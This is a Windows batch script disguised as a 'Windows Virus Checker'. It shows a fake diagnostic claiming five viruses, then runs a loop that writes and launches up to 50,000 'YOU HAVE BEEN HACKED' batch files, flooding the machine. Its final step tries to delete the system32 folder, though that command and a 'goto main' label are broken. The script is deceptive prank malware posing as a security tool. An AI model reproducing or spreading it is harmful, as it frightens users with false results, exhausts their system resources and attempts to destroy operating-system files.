@echo off
title Windows-Virus-Checker
cls
echo Welcome To Windows Virus Checker!
echo.
echo Please Run this Program In Administrator, If You Are Already This Program Will Function Correctly
echo.
echo Would You Like To Run A Diagnostic?
echo 1=Yes 2=No
set /p input=">"
if "%input%" == "1" goto diagnostic
if "%input%" == "2" goto diagnostic
goto notoption

:notoption
cls
echo That Is Not An Option. Please Try Again
pause
goto main

:diagnostic
cls
echo Running Diagnostic, This May Take A Few Minutes... 
ping localhost-n5>nul
goto doned

:doned
cls
echo Diagnostic Complete.
echo You Have 5 Viruses.
echo Would You Like To Remove Them?
set /p input=">"
if "%input%" == "1" goto removal
if "%input%" == "2" goto loop
goto notoption

:removal
cls
echo Removing Viruses...
echo This May Take Up To 5 Minutes.
pause
echo ERROR: c:\virus\ CANNOT BE FOUND
pause
echo ERROR: c:\virus\ CANNOT BE FOUND
pause
set number=0
goto loop

:loop
cls
if "%number%" == "50000" goto endcheck
color 0C
echo @echo off>>hacked%number%.bat
echo title HACKED>>hacked%number%.bat
echo color 0C>>hacked%number%.bat
echo echo YOU HAVE BEEN HACKED!!! LOLOLOL>>hacked%number%.bat
title yOU haVE BEEN HACKED!!!
start "%~dp0\hacked%number%.bat"
set /a number=%number% + 1
goto loop


:endcheck
cls
echo Wow! Your Computer Is Still Here!? You Got One Beefy Computer.
echo Time For No More Computer!
delete c:\system32\
pause